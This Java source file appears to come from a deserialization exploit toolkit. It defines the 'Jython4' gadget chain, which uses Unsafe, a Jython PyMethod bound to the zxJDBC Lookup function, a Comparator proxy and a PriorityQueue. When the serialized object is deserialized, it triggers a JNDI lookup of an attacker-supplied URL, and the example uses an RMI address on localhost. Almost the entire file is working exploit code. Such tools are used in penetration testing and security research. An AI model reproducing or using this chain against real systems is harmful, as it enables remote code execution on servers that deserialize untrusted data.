package com.ppp.chain.jython;

import com.ppp.JavaClassHelper;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.RanDomUtils;
import jdk.internal.dynalink.support.Lookup;
import org.python.core.PyMethod;
import org.python.core.PyString;
import sun.misc.Unsafe;

import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.util.Comparator;
import java.util.PriorityQueue;

@Dependencies({"org.python:jython-standalone:2.7.3"})
@Authors({Authors.ZDI})
@Sink({Sink.JNDI})
public class Jython4 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
//        PayloadRunner.run(Jython4.class, args);

        SinksHelper sinksHelper = new SinksHelper();
        sinksHelper.setSink(Jython4.class.getAnnotation(Sink.class).value()[0]);
        sinksHelper.setEnchant(EnchantType.DEFAULT);
        sinksHelper.setCommand("rmi://127.0.0.1:1099/wtkwre");
        JavaClassHelper javaClassHelper = new JavaClassHelper();
        javaClassHelper.setExtendsAbstractTranslet(true);
        sinksHelper.setJavaClassHelper(javaClassHelper);

        PayloadRunner.run(Jython4.class, args, sinksHelper);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        String url = (String) SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(url);

        return kickOffObject;
    }

    public Object getChain(String url) throws Exception {
        String s = RanDomUtils.generateRandomString(1);

        Field unsafeField = Unsafe.class.getDeclaredField("theUnsafe");
        unsafeField.setAccessible(true);
        Unsafe unsafe = (Unsafe) unsafeField.get(null);

        PyMethod pyMethod = (PyMethod) unsafe.allocateInstance(PyMethod.class);
        pyMethod.__func__ = new com.ziclix.python.sql.connect.Lookup();
        pyMethod.im_class = new PyString().getType();

        Comparator c = (Comparator) Proxy.newProxyInstance(
                Lookup.class.getClassLoader(),
                new Class[]{Comparator.class},
                pyMethod
        );
        PriorityQueue priorityQueue = new PriorityQueue(2, c);

        Object[] queue = new Object[]{
                new PyString(url),
                s
        };

        Field f = priorityQueue.getClass().getDeclaredField("queue");
        f.setAccessible(true);
        f.set(priorityQueue, queue);
        Field f2 = priorityQueue.getClass().getDeclaredField("size");
        f2.setAccessible(true);
        f2.set(priorityQueue, 2);

        return priorityQueue;

    }
}
